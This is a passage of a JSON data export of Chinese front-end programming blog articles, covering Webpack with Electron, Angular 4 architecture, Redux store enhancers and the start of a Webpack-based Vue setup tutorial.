代码，也就是这2个窗口需要的网页代码。\u003c/p\u003e\n\u003cp\u003e以上修改都完成后重新执行 Webpack 构建，对应的网页需要的代码都输出到了项目根目录下的 \u003ccode\u003edist\u003c/code\u003e 目录里。\u003c/p\u003e\n\u003cp\u003e为了以 Electron 应用的形式运行，还需要安装新依赖：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 安装 Electron 执行环境到项目中\u003c/span\u003e\nnpm i -D electron\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e安装成功后在项目目录下执行 \u003ccode\u003eelectron .\u003c/code\u003e 你就能成功看到启动的桌面应用了，效果如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Electron 应用运行效果图\" src=\"https://user-gold-cdn.xitu.io/2017/12/24/160862ce6dafd3e4?w=1677\u0026amp;h=1294\u0026amp;f=png\u0026amp;s=886715\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本实例\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/3-12%E6%9E%84%E5%BB%BAElectron%E5%BA%94%E7%94%A8.zip\"\u003e提供项目完整代码\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cfigure\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607259d52144ee4?w=1348\u0026amp;h=845\u0026amp;f=jpeg\u0026amp;s=183464\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/a\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e《深入浅出Webpack》全书在线阅读链接\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/3%E5%AE%9E%E6%88%98/3-12%E6%9E%84%E5%BB%BAElectron%E5%BA%94%E7%94%A8.html\"\u003e阅读原文\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514971005.4013","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac403363"},"id":"5a45ddd46fb9a044fb081423","author":{"$oid":"5a4cc38785472a29ac403357"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Angular 4.0 架构详解","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"很久没写这种比较偏概念类的东西了，不过我觉得没有形成一个知识架构，学习效率会大打折扣。在这里把我的所理解的知识分享给大家，部分内容引用自官方文档。下面进入主题 先来看一下官方放出的架构图。 接下来我按顺序并结合图来讲解一下。 Angular 或者 ionic 新建的项目，都会存…","content":"\u003cp\u003e很久没写这种比较偏概念类的东西了，不过我觉得没有形成一个知识架构，学习效率会大打折扣。在这里把我的所理解的知识分享给大家，部分内容引用自官方文档。下面进入主题\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eAngular架构概览\u003c/h2\u003e\n\u003cp\u003e先来看一下官方放出的架构图。\u003c/p\u003e\n\u003cp\u003e这个架构图展现了 Angular 应用中的 8 个主要构造块：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e模块 (module)\u003c/li\u003e\n\u003cli\u003e组件 (component)\u003c/li\u003e\n\u003cli\u003e模板 (template)\u003c/li\u003e\n\u003cli\u003e元数据 (metadata)\u003c/li\u003e\n\u003cli\u003e数据绑定 (data binding)\u003c/li\u003e\n\u003cli\u003e指令 (directive)\u003c/li\u003e\n\u003cli\u003e服务 (service)\u003c/li\u003e\n\u003cli\u003e依赖注入 (dependency injection)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e接下来我按顺序并结合图来讲解一下。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e1.模块 (module)\u003c/h2\u003e\n\u003cp\u003eAngular 或者 ionic 新建的项目，都会存在一个根模块，默认名是  AppModule。如果你使用了模块化来创建应用，包括 AppModule，每个都会存在一个 @NgModule 装饰器的类(虽然他很像 java 中的注解，但是他的官方命名叫装饰器)。我们新建的页面，如果不使用懒加载，都要\u003ccode\u003e在 @NgModule 中先声明后使用\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e下面举个例子，简单介绍一下 @NgModule 中的内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e//app.module.ts\n\nimport { NgModule }      from '@angular/core';\nimport { BrowserModule } from '@angular/platform-browser';\n@NgModule({\n  imports:      [ BrowserModule ],\n  providers:    [ Logger ],\n  declarations: [ AppComponent ],\n  exports:      [ AppComponent ],\n  bootstrap:    [ AppComponent ]\n})\nexport class AppModule { }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eimports 本模块声明的组件模板需要的类所在的其它模块。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eproviders 服务的创建者，并加入到全局服务列表中，可用于应用任何部分。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003edeclarations 声明本模块中拥有的视图类。Angular 有三种视图类：\u003cstrong\u003e组件、指令和管道\u003c/strong\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eexports declarations 的子集，可用于其它模块的组件模板。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ebootstrap 指定应用的主视图（称为根组件），它是所有其它视图的宿主。只有根模块才能设置 bootstrap 属性。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在图中的意义：看图左上角，模块是用来接收一个用来描述模块属性元数据对象的。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e2.组件 (component)、模板 (template)、元数据 (metadata)\u003c/h2\u003e\n\u003cp\u003e这次我们把这三点一起来讲，先看一下这段代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e//hero-list.component.ts\n\n@Component({\nselector:    'hero-list',\ntemplateUrl: './hero-list.component.html',\nproviders:  [ HeroService ]\n})\nexport class HeroListComponent implements OnInit {\n/* . . . */\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eComponent\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e组件\u003c/strong\u003e是一个装饰器，他能接受一个配置对象， Angular 会基于这些信息创建和展示组件及其视图。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eselector：CSS 选择器，它告诉 Angular 在父级 HTML 中查找  标签，创建并插入该组件。\u003c/li\u003e\n\u003cli\u003etemplateUrl：组件 HTML 模板的模块相对地址，如果使用 template 来写的话是用“`”这个符号来直接编写 HTML 代码。\u003c/li\u003e\n\u003cli\u003eproviders：组件所需服务的依赖注入。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003etemplate\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e模板\u003c/strong\u003e就是那段 HTML 代码，可以用 templateUrl 引入外面的，也可以用 template`` 直接写。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003emetadata\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e元数据\u003c/strong\u003e装饰器用类似的方式来指导 Angular 的行为。 例如 @Input、@Output、@Injectable 等是一些最常用的装饰器，用法就不在这里展开了。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在图中的意义：看图中间那一块，模板、元数据和组件共同描绘出这个视图。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e3.数据绑定 (data binding)\u003c/h2\u003e\n\u003cp\u003e这里一共展示四种数据绑定，看一下示例代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e//插值表达式    显示组件的hero.name属性的值\n\u0026lt;li\u0026gt;{{hero.name}}\u0026lt;/li\u0026gt;\n\n//属性绑定    把父组件selectedHero的值传到子组件的hero属性中\n\u0026lt;hero-detail [hero]=\"selectedHero\"\u0026gt;\u0026lt;/hero-detail\u0026gt;\n\n//事件绑定    用户点击英雄的名字时调用组件的selectHero方法\n\u0026lt;li (click)=\"selectHero(hero)\"\u0026gt;\u0026lt;/li\u0026gt;\n\n//双向绑定    数据属性值通过属性绑定从组件流到输入框。用户的修改通过事件绑定流回组件，把属性值设置为最新的值\n\u0026lt;input [(ngModel)]=\"hero.name\"\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能大家对各种括号看的眼花了，\u003cstrong\u003e总结一下：\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e双花括号是单向绑定，传递的是值。方向是 \u003ccode\u003e组件 -\u0026gt; 模板\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e方括号是单向绑定，传递的是属性。方向是 \u003ccode\u003e父组件 -\u0026gt; 子组件\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e圆括号是事件绑定，处理\u003ccode\u003e点击等活动（action）\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e方括号套圆括号是双向绑定，方向是 \u003ccode\u003e组件 \u0026lt;-\u0026gt; 模板\u003c/code\u003e。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在图中的意义：看图中间那一块，数据绑定给模板和组件提供数据交互的方式。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e4.指令 (directive)\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e严格来说组件就是一个指令\u003c/code\u003e，但是组件非常独特，并在 Angular 中位于中心地位，所以在架构概览中，我们把组件从指令中独立了出来。\n我们这里提到的指令有两种类型：\u003cbr\u003e\n结构型 structural 指令和属性 attribute 型指令。\u003cbr\u003e\n放一下原文证明一下组件确实算是一个指令：\u003c/p\u003e\n\u003cp\u003eWhile a component is technically a directive, components are so distinctive and central to Angular applications that this architectural overview separates components from directives.\u003cbr\u003e\nTwo other kinds of directives exist: structural and attribute directives.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e结构型指令\u003c/strong\u003e是 ngFor、ngIf 这种的，\u003ccode\u003e通过在 DOM 中添加、移除和替换元素来修改布局。\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e属性型指令\u003c/strong\u003e是 ngModel 这种的，\u003ccode\u003e用来修改一个现有元素的外观或行为。\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eAngular 还有少量指令，它们或者修改结构布局（例如  ngSwitch ）， 或者修改 DOM 元素和组件的各个方面（例如 ngStyle 和 ngClass）。之后我会单独写一篇讲他们用法的文章。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在图中的意义：看图右上角那一块，组件是一个带模板的指令，只是扩展了一些面向模板的特性。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e5.服务 (service)\u003c/h2\u003e\n\u003cp\u003e官方文档的概念：\u003cbr\u003e\n服务是一个广义范畴，包括：值、函数，或应用所需的特性。服务没有什么特别属于 Angular 的特性。Angular 对于服务也没有什么定义，它甚至都没有定义服务的基类，也没有地方注册一个服务。\u003c/p\u003e\n\u003cp\u003e这就像你在 iOS 或者 Android 里单独建了一个类叫 httpService ，封装了网络请求服务一样，不是具体的什么东西，就是一个概念了解下就行。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在图中的意义：看图左下角角那一块，服务是\u003cstrong\u003e用来封装可重用的业务逻辑\u003c/strong\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e6.依赖注入 (dependency injection)\u003c/h2\u003e\n\u003cp\u003e依赖注入是提供类的新实例的一种方式，还负责处理类所需的全部依赖。\u003cstrong\u003e大多数依赖都是服务\u003c/strong\u003e。 Angular 使用依赖注入来提供新组件以及组件所需的服务。\u003c/p\u003e\n\u003cp\u003e比如我们要给某组件导入 HeroService 这个服务，看这段代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003econstructor(private service: HeroService) { \n\u0009...\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这个constructor就是\u003ccode\u003e构造函数\u003c/code\u003e，依赖注入在 constructor 中进行。你也许会觉得前面写上 private、public 之类的很怪，这是 TypeScript 语法比较特殊，习惯就好。\u003c/p\u003e\n\u003cp\u003e当 Angular 创建组件时，会首先为组件所需的服务请求一个注入器 injector。我们必须先用注入器 injector 为 HeroService 注册一个提供商 provider。\u003c/p\u003e\n\u003cp\u003e意思就是我们必须在 providers 写上才能用，看这段代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e@Component({\n  selector:    'hero-list',\n  templateUrl: './hero-list.component.html',\n  providers:  [ HeroService ]\n})\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在图中的意义：看图左下角角那一块，依赖注入主要用来导入服务。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e最后给大家推荐一些学习资源\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://www.ituring.com.cn/book/1874\"\u003e《Angular权威教程》\u003c/a\u003e\u003cbr\u003e\n书内容不错，由浅入深，从网上买的正版纸质书，习惯PDF的朋友可以搜索一下电子书资源。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://my.oschina.net/mumu/blog/834254\"\u003eAngular2.0视频教程\u003c/a\u003e\u003cbr\u003e\n大漠穷秋出的教程，必看。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.angular.cn/docs/ts/latest/\"\u003eAngular中文文档\u003c/a\u003e\u003cbr\u003e\n官方文档，内容很全，需要一定的时间进行阅读。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.tslang.cn/docs/handbook/basic-types.html\"\u003eTypeScript中文文档\u003c/a\u003e\u003cbr\u003e\n官方文档，至少要把 TS 的基本语法要去掌握了。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.gitbook.com/book/buctwbzs/rxjs/details\"\u003eRxjs官方文档中文翻译\u003c/a\u003e\u003cbr\u003e\n翻译质量不错，值得一看。\u003c/p\u003e\n\u003cp\u003eAngular 现在出到 4.0 了，大家有可能会担心网上 Angular2.0 相关的内容会过时，其实不必有这种担心。\u003cbr\u003e\n按照官方的说法，从 2.0 版本开始出的新版本会保持向后兼容，不会出现 1 到 2 这么大的变化了，大家可以放心学习。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e好了，Angular 架构概览的八个主要点就是这些。有什么错误或问题可以在下方留言\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514953055.9421","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac403364"},"id":"5a4874096fb9a044fa1a34c7","author":{"$oid":"5a4cc38785472a29ac40334d"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"浅析Redux 的 store enhancer","meta":{"likeCount":0},"tag":["React.js","Redux","前端","JavaScript"],"comment":[],"shortContent":"相信大家都知道Redux的middleware（中间件）的概念，Redux通过middleware可以完成发送异步action（网络请求）、打印action的日志等功能。相对而言，Redux的store enhancer的概念，很多人并不是很清楚。 1. 基本概念及使用 其中，…","content":"\u003cp\u003e相信大家都知道Redux的middleware（中间件）的概念，Redux通过middleware可以完成发送异步action（网络请求）、打印action的日志等功能。相对而言，Redux的store enhancer的概念，很多人并不是很清楚。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. 基本概念及使用\u003c/h3\u003e\n\u003cp\u003eRedux通过API createStore创建store，createStore的函数签名如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ecreateStore(reducer, [preloadedState], [enhancer])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中，第3个可选参数enhancer，就是指的store enhancer。\u003c/p\u003e\n\u003cp\u003estore enhancer，可以翻译成store的增强器，顾名思义，就是增强store的功能。一个store enhancer，实际上就是一个高阶函数，它的参数是创建store的函数（store creator），返回值是一个可以创建功能更加强大的store的函数(enhanced store creator)，这和React中的高阶组件的概念很相似。\u003c/p\u003e\n\u003cp\u003estore enhancer 函数的结构一般如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eenhancerCreator\u003c/span\u003e\u003c/span\u003e() {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e createStore =\u0026gt; (...args) =\u0026gt; {\n    // \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e something based old store\n    // \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e a new enhanced store\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e注意，enhancerCreator是用于创建store enhancer 的函数，也就是说enhancerCreator的执行结果才是一个store enhancer。（…args） 参数代表创建store所需的参数，也就是createStore接收的参数，实际上就是（reducer, [preloadedState], [enhancer]）。\u003c/p\u003e\n\u003cp\u003e现在，我们来创建一个store enhancer，用于输出发送的action的信息和state的变化：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// autoLogger.js\n// store enhancer\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eautoLogger\u003c/span\u003e\u003c/span\u003e() {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e createStore =\u0026gt; (reducer, initialState, enhancer) =\u0026gt; {\n    const store = createStore(reducer, initialState, enhancer)\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e dispatch(action) {\n      console.log(`dispatch an action: \u003cspan class=\"hljs-variable\"\u003e${JSON.stringify(action)}\u003c/span\u003e`);\n      const res = store.dispatch(action);\n      const newState = store.getState();\n      console.log(`current state: \u003cspan class=\"hljs-variable\"\u003e${JSON.stringify(newState)}\u003c/span\u003e`);\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e res;\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {...store, dispatch}\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eautoLogger() 改变了store dispatch的默认行为，在每次发送action前后，都会输出日志信息。然后在创建store上，使用autoLogger()这个store enhancer:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// configureStore.js\nimport { createStore, applyMiddleware } from \u003cspan class=\"hljs-string\"\u003e'redux'\u003c/span\u003e;\nimport rootReducer from \u003cspan class=\"hljs-string\"\u003e'path/to/reducers'\u003c/span\u003e;\nimport autLogger from \u003cspan class=\"hljs-string\"\u003e'path/to/autoLogger'\u003c/span\u003e;\n\nconst store = createStore(\n  reducer，\n  autoLogger()\n);\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2.与middleware （中间件）的关系\u003c/h3\u003e\n\u003cp\u003e如果你了解redux-logger这个redux middleware，是不是感觉autoLogger()的作用和它很相似呢？难道store enhancer 和 middleware 可以实现相同的功能？确实如此。实际上，middleware的实现函数applyMiddleware本身就是一个store enhancer，applyMiddleware源码示意如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e applyMiddleware(...middlewares) {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e createStore =\u0026gt; (...args) =\u0026gt; {\n    // 省略\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n      ...store,\n      dispatch\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eapplyMiddleware的结构和前面提到的store enhancer的结构完全相同，applyMiddleware(...middlewares)的执行结果就是一个store enhancer。所以，可以用middleware实现的功能，当然也可以使用store enhancer 来实现了。从applyMiddleware(...middlewares)最终的返回结构{...store, dispatch}还可以推测出，applyMiddleware(...middlewares)这个store enhancer 主要用来修改store的dispatch方法，这也确实是middleware的作用：增强store的dispatch功能。middleware实际上是在applyMiddleware(...middlewares) 这个store enhancer之上的一层抽象，applyMiddleware(...middlewares) 传递给每一个middleware参数{getState, dispatch}，middleware对dispatch方法进行加强。\u003c/p\u003e\n\u003cp\u003e当同时使用applyMiddleware(...middlewares)和其他store enhancer时，往往可以先使用redux提供的compose函数，将这些store enhancer组合成一个：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// configureStore.js\nimport { createStore, applyMiddleware, compose } from \u003cspan class=\"hljs-string\"\u003e'redux'\u003c/span\u003e;\nimport rootReducer from \u003cspan class=\"hljs-string\"\u003e'path/to/reducers'\u003c/span\u003e;\nimport autLogger from \u003cspan class=\"hljs-string\"\u003e'path/to/autoLogger'\u003c/span\u003e;\n\nconst enhancer = compose(\n  applyMiddleware(...middlewares),\n  autLogger()\n);\n\nconst store = createStore(\n  reducer，\n  enhancer\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e经过compose组合后，所有的store enhancer会形成一个洋葱模型，compose中的第一个enhancer处于洋葱模型的最外层，最后一个enhancer处于洋葱模型的最内层，每当发送一个action，都会经过洋葱模型从外到内的每一层enhancer的处理，如下图所示。因为一般我们通过middleware处理异步action，为保证其他enhancer接收到的都是普通action，所以需要将applyMiddleware(...middlewares)作为第一个store enhancer 传给 compose，让所有的action先经过applyMiddleware(...middlewares)的处理。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"图 1\" src=\"https://user-gold-cdn.xitu.io/2017/12/31/160ab091bbfa593a?w=470\u0026amp;h=449\u0026amp;f=jpeg\u0026amp;s=29021\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eapplyMiddleware(…middlewares)将middleware限制为只可以增强store dispatch的功能，但这只是它自身的规范限制，对于其他store enhancer，你可以增强store中包含的任意方法的功能，如dispatch、subscribe、getState、replaceReducer等。毕竟，store只是一个包含一些函数的普通JavaScript对象，可以很容易的复制其中的方法，并增加新的功能。\u003c/p\u003e\n\u003cp\u003e我们再来看一个例子，\u003ca target=\"_blank\" href=\"https://github.com/elgerlambert/redux-localstorage\"\u003eredux-localstorage\u003c/a\u003e， 这个store enhancer 用来自动将store中的state持久化到localStorage中。它的主要代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// store enhancer\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e persistState(paths, config) {\n  // 一些功能选项配置\n\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e next =\u0026gt; (reducer, initialState, enhancer) =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e persistedState\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e finalInitialState\n\n    try {\n      persistedState = deserialize(\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003eStorage.getItem(key))\n      finalInitialState = merge(initialState, persistedState)\n    } catch (e) {\n      console.warn(\u003cspan class=\"hljs-string\"\u003e'Failed to retrieve initialize state from localStorage:'\u003c/span\u003e, e)\n    }\n\n    const store = next(reducer, finalInitialState, enhancer)\n    const slicerFn = slicer(paths)\n    \n    // 主要代码\n    store.subscribe(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n      const state = store.getState()\n      const subset = slicerFn(state)\n\n      try {\n        \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003eStorage.setItem(key, serialize(subset))\n      } catch (e) {\n        console.warn(\u003cspan class=\"hljs-string\"\u003e'Unable to persist state to localStorage:'\u003c/span\u003e, e)\n      }\n    })\n\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e store\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个enhancer做的事情其实很简单，只是在创建store后，立即订阅了store的变化，当store中的state发生变化时，将state持久化到localStorage。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3.破坏性enhancer\u003c/h3\u003e\n\u003cp\u003e因为store enhancer中，我们可以任意复制、改变store中的方法，所以在自定义store enhancer时，有可能会因为破坏了Redux的正常工作流，导致整个应用无法正常工作。下面就是一个破坏性enhancer的例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ebreakingEnhancer\u003c/span\u003e\u003c/span\u003e() {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e createStore =\u0026gt; (reducer, initialState, enhancer) =\u0026gt; {\n    const store = createStore(reducer, initialState, enhancer)\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e dispatch(action) {\n      console.log(`dispatch an action: \u003cspan class=\"hljs-variable\"\u003e${JSON.stringify(action)}\u003c/span\u003e`);\n      console.log(`current state: \u003cspan class=\"hljs-variable\"\u003e${JSON.stringify(newState)}\u003c/span\u003e`);\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e res;\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {...store, dispatch}\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个例子重新创建了一个dispatch方法，但在新的dispatch方法中，并没有调用老的dispatch方法，将action发送出去，导致action无法正常发送，整个应用自然也就无法工作。所以，自定义store enhancer时，一定要注意，不要破坏了Redux的原有工作流。\u003c/p\u003e\n","buildTime":"1514979058.6112","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac403366"},"id":"5a425cb4f265da43294e4f2e","author":{"$oid":"5a4cc38785472a29ac40335a"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/26/160934997ed72579?w=292\u0026h=191\u0026f=png\u0026s=5249","https://user-gold-cdn.xitu.io/2017/12/26/1609353959e1e592?w=600\u0026h=171\u0026f=png\u0026s=4239","https://user-gold-cdn.xitu.io/2017/12/26/160935cfa424a6e3?w=517\u0026h=79\u0026f=png\u0026s=3628","https://user-gold-cdn.xitu.io/2017/12/26/1609361c9c1278c2?w=529\u0026h=278\u0026f=png\u0026s=11203","https://user-gold-cdn.xitu.io/2017/12/26/160938614cf6772e?w=323\u0026h=294\u0026f=png\u0026s=9101","https://user-gold-cdn.xitu.io/2017/12/26/160938b83b51babd?w=438\u0026h=273\u0026f=png\u0026s=9619","https://user-gold-cdn.xitu.io/2017/12/27/16093904b1682b50?w=516\u0026h=143\u0026f=png\u0026s=8665"],"screenShot":null}],"title":"webpack 搭建 vue 项目","meta":{"likeCount":0},"tag":["Vue.js","Webpack"],"comment":[],"shortContent":"由于在使用vue时会用到很多es6的语法，但是现在很多浏览器对es6的支持不是很好，所以在编译时需要将这些语法转换es5的语法，此时我们使用babel来进行编译。 babel的使用请阅读官网文档http://babeljs.cn/。 此时一个基于webpack的vue 项目就搭…","content":"\u003ch2 class=\"heading\"\u003e前期准备\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://doc.webpack-china.org/concepts\"\u003ewebpack\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://cn.vuejs.org\"\u003evue.js\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003enpm\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://nodejs.org/zh-cn\"\u003enodejs\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://es6.ruanyifeng.com\"\u003eES6语法\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e由于本文内容是通过npm来加载vue，所以开始之前需安装nodejs环境，安装完成之后再执行以下步骤：\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e创建项目\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    mkdir  vue-demo\n    \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e vue-demo\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e使用 npm init 命令  生成package.json文件\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm init\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e大概生成的package.json 如下:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" 